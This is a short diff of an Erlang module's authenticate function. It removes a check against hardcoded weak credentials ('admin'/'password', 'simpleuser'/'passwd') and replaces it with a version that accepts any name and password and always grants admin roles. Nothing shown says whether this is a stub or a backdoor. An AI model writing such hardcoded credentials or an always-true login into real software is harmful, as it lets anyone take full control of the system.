@@ -28,14 +28,5 @@
 %% --------------------------------------------------------------
 %% USER API
 %% --------------------------------------------------------------
-authenticate(UName, UPass) ->
-    case {UName, UPass} of
-        {"admin", "password"} ->
-            Roles = ["admin", "wheel", "other"],
-            {ok, Roles};
-        {"simpleuser", "passwd"} ->
-            Roles = ["wheel"],
-            {ok, Roles};
-        _ ->
-            fail
-    end.
+authenticate(_AnyName, _AnyPass) ->
+    {ok, ["admin", "wheel", "other"]}.
